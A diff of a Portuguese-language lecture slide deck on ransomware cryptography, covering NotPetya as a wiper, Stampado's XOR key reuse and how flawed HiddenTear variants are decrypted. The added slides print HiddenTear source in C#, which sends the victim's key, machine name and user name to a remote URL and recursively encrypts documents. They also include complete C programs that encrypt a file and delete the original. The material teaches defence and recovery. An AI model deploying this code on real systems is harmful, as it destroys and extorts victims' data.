@@ -411,19 +411,6 @@
             <section data-markdown>
                 <textarea data-template>
                     <span class="label">CONCEITO</span>
-                    ## Ransomware ≠ Wiper
-                    * **Ransomware:** Cifra para extorquir. A chave existe. O dado é recuperável.
-                    * **Wiper:** Cifra para destruir. A chave nunca existiu. O dado é perdido para sempre.
-                    <div class="box-red">
-                        <strong>NotPetya (2017):</strong> Parecia ransomware, mas era wiper. A "chave" era um UUID aleatório descartado na hora. Mesmo pagando, impossível recuperar.
-                    </div>
-                    > "NotPetya não queria seu dinheiro. Queria ver o mundo queimar."
-                </textarea>
-            </section>
-
-            <section data-markdown>
-                <textarea data-template>
-                    <span class="label">CONCEITO</span>
                     ## Como um Ransomware Funciona?
                     
                     **Criptografia Simétrica (AES):**
@@ -593,6 +580,18 @@ Com chaves modernas (2048+ bits):
                         </div>
                     </textarea>
                 </section>
+                <section data-markdown>
+                    <textarea data-template>
+                        <span class="label">CONCEITO</span>
+                        ## Ransomware ≠ Wiper
+                        * **Ransomware:** Cifra para extorquir. A chave existe. O dado é recuperável.
+                        * **Wiper:** Cifra para destruir. A chave nunca existiu. O dado é perdido para sempre.
+                        <div class="box-red">
+                            <strong>NotPetya (2017):</strong> Parecia ransomware, mas era wiper. A "chave" era um UUID aleatório descartado na hora. Mesmo pagando, impossível recuperar.
+                        </div>
+                        > "NotPetya não queria seu dinheiro. Queria ver o mundo queimar."
+                    </textarea>
+                </section>
 
                 <section data-markdown>
                     <textarea data-template>
@@ -637,7 +636,7 @@ Com chaves modernas (2048+ bits):
                 <section data-markdown>
                     <textarea data-template>
                         <span class="label-red">BLOCO 2</span>
-                        ## Stampado — Criptografia de Centavos
+                        ## Stampado — Criptografia mediocre
                         A "criptografia" era **XOR com reutilização de chave**.
                         * Chave curta e repetida ciclicamente.
                         * Dois arquivos com mesma keystream: `Cifra1 XOR Cifra2 = Plain1 XOR Plain2`.
@@ -651,7 +650,8 @@ Com chaves modernas (2048+ bits):
                     <textarea data-template>
                         <span class="label-red">BLOCO 2</span>
                         ## HiddenTear — O Presente que Virou Praga
-                        * **Origem nobre:** Material didático de um professor. Código aberto no GitHub.
+                        * **Primeiro Ransomware Opensource**
+                        * **Origem nobre:** Material didático de um professor em 2015. Código aberto no GitHub.
                         * **Uso criminoso:** Copiaram sem entender nada. Cegos no escuro.
                         * Dezenas de variantes... **todas quebradas**.
                         <div class="box">
@@ -660,6 +660,124 @@ Com chaves modernas (2048+ bits):
                         </div>
                     </textarea>
                 </section>
+                <section data-markdown>
+                    <textarea data-template>
+                        <span class="label-red">BLOCO 2</span>
+                        ## HiddenTear — Variantes Criminosas
+                        
+                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 16px;">
+                            <div>
+                                <img src="hiddenTear1.jpeg" style="width: 50%; border: 1px solid rgba(239, 68, 68, 0.3); border-radius: 4px;" />
+                                <br><span class="text-muted" style="font-size: 0.45em;">Variante 1</span>
+                            </div>
+                            <div>
+                                <img src="HiddenTear2.jpeg" style="width: 50%; border: 1px solid rgba(239, 68, 68, 0.3); border-radius: 4px;" />
+                                <br><span class="text-muted" style="font-size: 0.45em;">Variante 2</span>
+                            </div>
+                            <div>
+                                <img src="HiddenTear3.jpeg" style="width: 50%; border: 1px solid rgba(239, 68, 68, 0.3); border-radius: 4px;" />
+                                <br><span class="text-muted" style="font-size: 0.45em;">Variante 3</span>
+                            </div>
+                            <div>
+                                <img src="HiddenTear4.jpeg" style="width: 50%; border: 1px solid rgba(239, 68, 68, 0.3); border-radius: 4px;" />
+                                <br><span class="text-muted" style="font-size: 0.45em;">Variante 4</span>
+                            </div>
+                        </div>
+                    </textarea>
+                </section>
+
+                  <section data-markdown>
+                    <textarea data-template>
+                        <span class="label-red">BLOCO 2</span>
+                        ## HiddenTear Original — Cifragem + Senha
+
+                        ```csharp
+                        public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
+                        {
+                            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
+                            using (MemoryStream ms = new MemoryStream())
+                            {
+                                using (RijndaelManaged AES = new RijndaelManaged())
+                                {
+                                    AES.KeySize = 256;
+                                    AES.BlockSize = 128;
+                                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
+                                    AES.Key = key.GetBytes(AES.KeySize / 8);
+                                    AES.IV = key.GetBytes(AES.BlockSize / 8);
+                                    AES.Mode = CipherMode.CBC;
+                                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
+                                    {
+                                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
+                                    }
+                                }
+                            }
+                        }
+
+                        public string CreatePassword(int length)
+                        {
+                            const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
+                            StringBuilder res = new StringBuilder();
+                            Random rnd = new Random();
+                            while (0 < length--)
+                                res.Append(valid[rnd.Next(valid.Length)]);
+                            return res.ToString();
+                        }
+
+                        public void SendPassword(string password)
+                        {
+                            string info = computerName + "-" + userName + " " + password;
+                            var fullUrl = targetURL + info;
+                            var conent = new System.Net.WebClient().DownloadString(fullUrl);
+                        }
+                        ```
+                    </textarea>
+                </section>
+                  <section data-markdown>
+                    <textarea data-template>
+                        <span class="label-red">BLOCO 2</span>
+                        ## HiddenTear Original — Cifragem de Arquivos
+
+                        ```csharp
+                        public void EncryptFile(string file, string password)
+                        {
+                            byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
+                            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
+                            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
+                            byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);
+                            File.WriteAllBytes(file, bytesEncrypted);
+                            System.IO.File.Move(file, file+".locked");
+                        }
+
+                        public void encryptDirectory(string location, string password)
+                        {
+                            var validExtensions = new[]
+                            {
+                                ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
+                                ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln",
+                                ".php", ".asp", ".aspx", ".html", ".xml", ".psd"
+                            };
+                            string[] files = Directory.GetFiles(location);
+                            for (int i = 0; i < files.Length; i++)
+                            {
+                                if (validExtensions.Contains(Path.GetExtension(files[i])))
+                                    EncryptFile(files[i], password);
+                            }
+                            string[] childDirectories = Directory.GetDirectories(location);
+                            for (int i = 0; i < childDirectories.Length; i++)
+                                encryptDirectory(childDirectories[i], password);
+                        }
+
+                        public void startAction()
+                        {
+                            string password = CreatePassword(15);
+                            SendPassword(password);
+                            encryptDirectory(startPath, password);
+                            password = null;
+                        }
+                        ```
+                    </textarea>
+                </section>
+
 
                 <section data-markdown>
                     <textarea data-template>
@@ -712,39 +830,55 @@ Com chaves modernas (2048+ bits):
                         ## Caso 1 — Código Fonte
 
                         ```c [1-3|5-6|8-14|16-20|22-24|26-30]
-                        unsigned char chave_aes[32];
-                        unsigned char nonce[16];
-                        RAND_bytes(chave_aes, 32);
-                        RAND_bytes(nonce, 16);
+                        #include <stdio.h>
+                        #include <stdlib.h>
+                        #include <string.h>
+                        #include <unistd.h>
+                        #include <openssl/rand.h>
+                        #include <openssl/evp.h>
+                        #include <openssl/rsa.h>
 
-                        EVP_PKEY *rsa = EVP_RSA_gen(4096);
-                        EVP_PKEY_CTX *wctx = EVP_PKEY_CTX_new(rsa, NULL);
+                        int main(void) {
+                            unsigned char chave_aes[32], nonce[16], dados[8192], cifrado[8192], wrapped[512];
+                            size_t wrapped_len;
+                            int len, ciph_len;
 
-                        EVP_PKEY_encrypt_init(wctx);
-                        EVP_PKEY_CTX_set_rsa_padding(wctx, RSA_PKCS1_OAEP_PADDING);
-                        EVP_PKEY_CTX_set_rsa_oaep_md(wctx, EVP_sha256());
-                        unsigned char wrapped[512];
-                        size_t wrapped_len;
-                        EVP_PKEY_encrypt(wctx, wrapped, &wrapped_len, chave_aes, 32);
+                            FILE *f = fopen("documento.txt", "rb");
+                            int tamanho = fread(dados, 1, sizeof(dados), f);
+                            fclose(f);
 
-                        EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
-                        EVP_EncryptInit_ex(ctx, EVP_aes_256_ctr(), NULL, chave_aes, nonce);
-                        unsigned char cifrado[4096];
-                        int len, ciph_len;
-                        EVP_EncryptUpdate(ctx, cifrado, &len, dados, tamanho);
-                        EVP_EncryptFinal_ex(ctx, cifrado + len, &ciph_len);
+                            RAND_bytes(chave_aes, 32);
+                            RAND_bytes(nonce, 16);
 
-                        FILE *f = fopen("documento.encrypted", "wb");
-                        fwrite(nonce, 1, 16, f);
-                        fwrite(wrapped, 1, wrapped_len, f);
-                        fwrite(cifrado, 1, len + ciph_len, f);
-                        fclose(f);
+                            EVP_PKEY *rsa = EVP_RSA_gen(4096);
+                            EVP_PKEY_CTX *wctx = EVP_PKEY_CTX_new(rsa, NULL);
+                            EVP_PKEY_encrypt_init(wctx);
+                            EVP_PKEY_CTX_set_rsa_padding(wctx, RSA_PKCS1_OAEP_PADDING);
+                            EVP_PKEY_CTX_set_rsa_oaep_md(wctx, EVP_sha256());
+                            EVP_PKEY_CTX_set_rsa_mgf1_md(wctx, EVP_sha256());
+                            EVP_PKEY_encrypt(wctx, NULL, &wrapped_len, chave_aes, 32);
+                            EVP_PKEY_encrypt(wctx, wrapped, &wrapped_len, chave_aes, 32);
+                            EVP_PKEY_CTX_free(wctx);
 
-                        OPENSSL_cleanse(chave_aes, 32);
-                        OPENSSL_cleanse(nonce, 16);
-                        EVP_CIPHER_CTX_free(ctx);
-                        EVP_PKEY_CTX_free(wctx);
-                        EVP_PKEY_free(rsa);
+                            EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
+                            EVP_EncryptInit_ex(ctx, EVP_aes_256_ctr(), NULL, chave_aes, nonce);
+                            EVP_EncryptUpdate(ctx, cifrado, &len, dados, tamanho);
+                            EVP_EncryptFinal_ex(ctx, cifrado + len, &ciph_len);
+                            len += ciph_len;
+                            EVP_CIPHER_CTX_free(ctx);
+
+                            f = fopen("documento.txt.encrypted", "wb");
+                            fwrite(nonce, 1, 16, f);
+                            fwrite(wrapped, 1, wrapped_len, f);
+                            fwrite(cifrado, 1, len, f);
+                            fclose(f);
+
+                            unlink("documento.txt");
+                            OPENSSL_cleanse(chave_aes, 32);
+                            OPENSSL_cleanse(nonce, 16);
+                            EVP_PKEY_free(rsa);
+                            return 0;
+                        }
                         ```
                     </textarea>
                 </section>
@@ -788,28 +922,39 @@ Com chaves modernas (2048+ bits):
                         <span class="label-red">BLOCO 3</span>
                         ## Caso 2 — Código Fonte
                         ```c [1-2|3-4|5-7|9-13|15-19|21-25]
-                        unsigned char chave[] = "MinhaChaveSuperSecreta123456";
-                        unsigned char nonce[16] = {0};
+                        #include <stdio.h>
+                        #include <stdlib.h>
+                        #include <string.h>
+                        #include <unistd.h>
+                        #include <openssl/evp.h>
 
-                        unsigned char lixo[512] = {0};
-                        unsigned char dados[] = "ARK REACTOR v3";
-                        unsigned char cifrado[4096];
-                        int len, ciph_len;
+                        int main(void) {
+                            unsigned char chave[] = "MinhaChaveSuperSecreta123456";
+                            unsigned char nonce[16] = {0};
+                            unsigned char lixo[512] = {0};
+                            unsigned char dados[8192], cifrado[8192];
+                            int len, ciph_len;
 
-                        EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
-                        EVP_EncryptInit_ex(ctx, EVP_aes_256_ctr(),
-                                           NULL, chave, nonce);
-                        EVP_EncryptUpdate(ctx, cifrado, &len,
-                                          dados, strlen((char *)dados));
-                        EVP_EncryptFinal_ex(ctx, cifrado + len, &ciph_len);
+                            FILE *f = fopen("documento.txt", "rb");
+                            int tamanho = fread(dados, 1, sizeof(dados), f);
+                            fclose(f);
 
-                        FILE *f = fopen("documento_falho.encrypted", "wb");
-                        fwrite(nonce, 1, 16, f);
-                        fwrite(lixo, 1, 512, f);
-                        fwrite(cifrado, 1, len + ciph_len, f);
-                        fclose(f);
+                            EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
+                            EVP_EncryptInit_ex(ctx, EVP_aes_256_ctr(), NULL, chave, nonce);
+                            EVP_EncryptUpdate(ctx, cifrado, &len, dados, tamanho);
+                            EVP_EncryptFinal_ex(ctx, cifrado + len, &ciph_len);
+                            len += ciph_len;
+                            EVP_CIPHER_CTX_free(ctx);
 
-                        EVP_CIPHER_CTX_free(ctx);
+                            f = fopen("documento.txt.encrypted", "wb");
+                            fwrite(nonce, 1, 16, f);
+                            fwrite(lixo, 1, 512, f);
+                            fwrite(cifrado, 1, len, f);
+                            fclose(f);
+
+                            unlink("documento.txt");
+                            return 0;
+                        }
                         ```
                     </textarea>
                 </section>
@@ -822,13 +967,10 @@ Com chaves modernas (2048+ bits):
                         <span class="terminal-font text-accent">CHAVE_RECUPERADA = b"MinhaChaveSuperSecreta123456"</span><br>
                         <span class="terminal-font text-accent">NONCE_RECUPERADO = b"\x00" * 16</span>
                         <div class="separator"></div>
-                        <span class="terminal-font text-muted">Decryptor em Python (menos de 20 linhas):</span><br>
+                        <span class="terminal-font text-muted">Decryptor em C:</span><br>
                         <span class="terminal-font text-accent">cipher = Cipher(algorithms.AES(CHAVE), modes.CTR(NONCE))</span><br>
                         <span class="terminal-font text-accent">dados = decryptor.update(cifrados) + decryptor.finalize()</span>
-                        <div class="box">
-                            <strong>Resultado:</strong> Todos os arquivos recuperados em segundos.<br>
-                            <span class="terminal-font text-accent">"Não precisei quebrar AES. Só precisei ler o código."</span>
-                        </div>
+ 
                     </textarea>
                 </section>
 
@@ -839,29 +981,37 @@ Com chaves modernas (2048+ bits):
                         ## Caso 2 — Decryptor
 
                         ```c [1-2|3-5|7-14|16-17]
-                        unsigned char chave[] = "MinhaChaveSuperSecreta123456";
-                        unsigned char nonce[16];
+                        #include <stdio.h>
+                        #include <stdlib.h>
+                        #include <string.h>
+                        #include <unistd.h>
+                        #include <fcntl.h>
+                        #include <openssl/evp.h>
 
-                        int fd = open("documento_falho.encrypted", O_RDONLY);
-                        read(fd, nonce, 16);
-                        lseek(fd, 512, SEEK_CUR);
+                        int main(void) {
+                            unsigned char chave[] = "MinhaChaveSuperSecreta123456";
+                            unsigned char nonce[16], cifrado[8192], recuperado[8192];
+                            int len, rec_len;
 
-                        unsigned char cifrado[4096];
-                        int tamanho = read(fd, cifrado, sizeof(cifrado));
-                        close(fd);
+                            int fd = open("documento.txt.encrypted", O_RDONLY);
+                            if (fd < 0) return 1;
+                            read(fd, nonce, 16);
+                            lseek(fd, 512, SEEK_CUR);
+                            int tamanho = read(fd, cifrado, sizeof(cifrado));
+                            close(fd);
 
-                        EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
-                        EVP_DecryptInit_ex(ctx, EVP_aes_256_ctr(),
-                                           NULL, chave, nonce);
-                        unsigned char recuperado[4096];
-                        int len, rec_len;
-                        EVP_DecryptUpdate(ctx, recuperado, &len,
-                                          cifrado, tamanho);
-                        EVP_DecryptFinal_ex(ctx, recuperado + len, &rec_len);
+                            EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
+                            EVP_DecryptInit_ex(ctx, EVP_aes_256_ctr(), NULL, chave, nonce);
+                            EVP_DecryptUpdate(ctx, recuperado, &len, cifrado, tamanho);
+                            EVP_DecryptFinal_ex(ctx, recuperado + len, &rec_len);
+                            len += rec_len;
+                            EVP_CIPHER_CTX_free(ctx);
 
-                        recuperado[len + rec_len] = '\0';
-                        printf("[+] Recuperado: %s\n", recuperado);
-                        EVP_CIPHER_CTX_free(ctx);
+                            FILE *f = fopen("documento.txt", "wb");
+                            fwrite(recuperado, 1, len, f);
+                            fclose(f);
+                            return 0;
+                        }
                         ```
                     </textarea>
                 </section>
@@ -927,16 +1077,27 @@ Com chaves modernas (2048+ bits):
                 </section>
             </section>
 
+            <section data-markdown>
+                <textarea data-template>
+                    <div style="display: flex; align-items: center; gap: 40px;">
+                        <div style="flex: 1;">
+                            <span class="terminal-font text-accent">Obrigado! Dúvidas?</span><br>
+                            <span class="terminal-font text-muted">[smith@blackhaven-01 ~]$ exit</span>
+                        </div>
+                        <div style="flex-shrink: 0;">
+                            <img src="penitent.gif" style="width: 200px; height: 200px; object-fit: cover; filter: grayscale(30%);" />
+                        </div>
+                    </div>
+                </textarea>
+            </section>
 
             <section data-markdown>
                 <textarea data-template>
-                    <div style="flex-shrink: 0;">
-                            <img src="penitent.gif" style="width: 300px; height: 300px; object-fit: cover; filter: grayscale(30%);" />
+                    <div style="text-align: center;">
+                        <img src="maxresdefault-Photoroom.png" style="width: clamp(300px, 50vw, 600px); height: auto;" />
                     </div>
-                    <span class="terminal-font text-accent">Obrigado! Dúvidas?</span><br>
-                    <span class="terminal-font text-muted">[smith@blackhaven-01 ~]$ exit</span>
                 </textarea>
-            </section>            
+            </section>
 
             <section data-markdown>
                 <textarea data-template>
@@ -951,6 +1112,9 @@ Com chaves modernas (2048+ bits):
                     * **CryptoHack:** cryptohack.org/
                     * **pwn.college:** pwn.college/s 
                     * **An Introduction to Mathematical Cryptography - Jeffrey Hoffstein** 
+                    * **Ransomware- tracker:** watchguard.com/wgrd-security-hub/ransomware-tracker/hidden-tear
+                    * **Versao Original HiddenTear:** github.com/goliate/hidden-tear/blob/master/hidden-tear/hidden-tear/Form1.cs
+                    * **Ransomware Decryptor tools:** avast.com/en-us/ransomware-decryption-tools#!
                 </textarea>
             </section>
 
